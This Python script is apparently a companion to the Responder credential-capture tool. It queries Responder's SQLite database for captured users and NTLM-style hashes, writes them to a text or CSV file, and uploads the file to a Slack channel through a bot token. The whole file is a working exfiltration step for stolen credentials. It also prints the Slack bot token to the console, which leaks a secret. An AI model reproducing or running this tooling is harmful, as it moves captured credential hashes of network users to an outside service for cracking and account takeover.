import requests, sqlite3, json, slack_sdk, logging, os, csv
from responderSlack import DbConnect, executeQuery
from slack_sdk import WebClient
from slack_sdk.errors import SlackApiError

# Configure logging
logger = logging.getLogger(__name__)

def loadConfig():
    global respDB, channelID, botToken
        
    with open("./config.json", "r") as configFile:
        config = json.loads(configFile.read())
    
    respDB = config["ResponderDB"]
    channelID = config["channelID"]
    botToken = config["botToken"]
    print(botToken)
    if channelID == "replaceMe" or botToken == "replaceMe":
        raise ValueError("Must add channelID and botToken in config.json!")

def sendFileWebhook(fileName):
    client = WebClient(token=botToken)
    logger = logging.getLogger(__name__)

    try:
        # Call the files.upload method using the WebClient
        # Uploading files requires the `files:write` scope
        result = client.files_upload(
            channels=channelID,
            initial_comment="Here's my file :smile:",
            file=fileName,
        )
        # Log the result
        logger.info(result)

    except SlackApiError as e:
        logger.error("Error uploading file: {}".format(e))

def buildCsv():
    """
    Build a CSV file with all hashes from the database.

    Returns:
        bool: True if successful, False otherwise
    """
    try:
        res = executeQuery(cursor, f"SELECT user,type,client,fullhash FROM Responder")
        if res is None:
            logger.error("Failed to query hashes for CSV export")
            return False

        output = []
        header = ['user','type','client','fullhash']
        for row in res.fetchall():
            output.append([row[0],row[1],row[2],row[3]])
        print(output)

        with open('hashes.csv', 'w', newline='') as csvFile:
            writer = csv.writer(csvFile)
            writer.writerow(header)
            writer.writerows(output)

        logger.info(f"Successfully exported {len(output)} hashes to hashes.csv")
        return True
    except sqlite3.Error as e:
        logger.error(f"Database error in buildCsv: {e}")
        return False
    except IOError as e:
        logger.error(f"File I/O error in buildCsv: {e}")
        return False

def buildFile():
    """
    Build a text file with all hashes from the database.

    Returns:
        bool: True if successful, False otherwise
    """
    try:
        res = executeQuery(cursor, f"SELECT fullhash FROM Responder")
        if res is None:
            logger.error("Failed to query hashes for text file export")
            return False

        hash_count = 0
        with open('hashes.txt', 'w') as hashFile:
            for row in res.fetchall():
                hashFile.writelines(f"{row[0]}\n")
                hash_count += 1

        logger.info(f"Successfully exported {hash_count} hashes to hashes.txt")
        return True
    except sqlite3.Error as e:
        logger.error(f"Database error in buildFile: {e}")
        return False
    except IOError as e:
        logger.error(f"File I/O error in buildFile: {e}")
        return False


def main():
    """
    Main function to export hashes and send to Slack.
    Includes proper error handling and connection cleanup.
    """
    global cursor

    try:
        loadConfig()
        cursor = DbConnect(respDB)

        # buildCsv()  # Uncomment to also export CSV format
        if buildFile():
            sendFileWebhook("hashes.txt")
        else:
            logger.error("Failed to build hash file, skipping webhook upload")

    except Exception as e:
        logger.error(f"Error in main: {e}")
        raise
    finally:
        # Ensure database connection is properly closed
        if cursor:
            cursor.close()
            logger.info("Database connection closed")



if __name__ == "__main__":
    main()